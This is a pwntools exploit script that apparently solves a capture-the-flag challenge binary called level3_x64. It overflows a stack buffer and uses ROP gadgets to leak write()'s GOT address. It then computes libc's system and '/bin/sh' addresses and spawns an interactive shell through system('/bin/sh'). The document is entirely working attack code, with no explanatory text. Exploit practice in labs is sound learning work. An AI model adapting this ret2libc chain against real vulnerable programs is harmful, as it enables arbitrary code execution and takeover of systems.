from pwn import *


def ret2_libc3_3(file_name='/mnt/hgfs/CyberSecurity/PWN/test/pwn3_x64/level3_x64'):
    print("ret2_libc3 start")

    io = process([file_name])

    level3_elf = ELF(file_name)
    libc_elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')

    write_plt = p64(level3_elf.plt['write'])
    write_got = p64(level3_elf.got['write'])

    vulnerable_func_symbol = p64(level3_elf.symbols['vulnerable_function'])

    payload_1 = b'A' * 136

    # write(write_got)
    pop2_ret = p64(0x4006b1)  # pop rsi ; pop r15 ; ret
    payload_1 += pop2_ret + write_got + b'A' * 8
    pop2_ret = p64(0x4006b3)  # pop rdi ; ret
    payload_1 += pop2_ret + p64(0x1)
    payload_1 += write_plt

    # vulnerable_func_symbol
    payload_1 += vulnerable_func_symbol

    print(io.recvline())
    io.sendline(payload_1)

    write_text = u64(io.recv(8))
    io.recv()
    write_plt = libc_elf.symbols['write']  # 00000000000EF3B0
    system_plt = libc_elf.symbols['system']  # 0000000000046590
    bin_sh_rodata = next(libc_elf.search(b'/bin/sh'))  # 0000000000180543

    system_text = p64(write_text - (write_plt - system_plt))
    bin_sh_rodata = p64(write_text + (bin_sh_rodata - write_plt))
    print(hex(write_text))
    print(hex(u64(system_text)))
    print(hex(u64(bin_sh_rodata)))

    payload_2 = b'A' * 136

    # system('/bin/sh')
    pop_ret = p64(0x4006b3)  # pop rdi ; ret
    payload_2 += pop_ret + bin_sh_rodata + system_text

    io.sendline(payload_2)
    io.interactive()


if __name__ == '__main__':
    ret2_libc3_3()
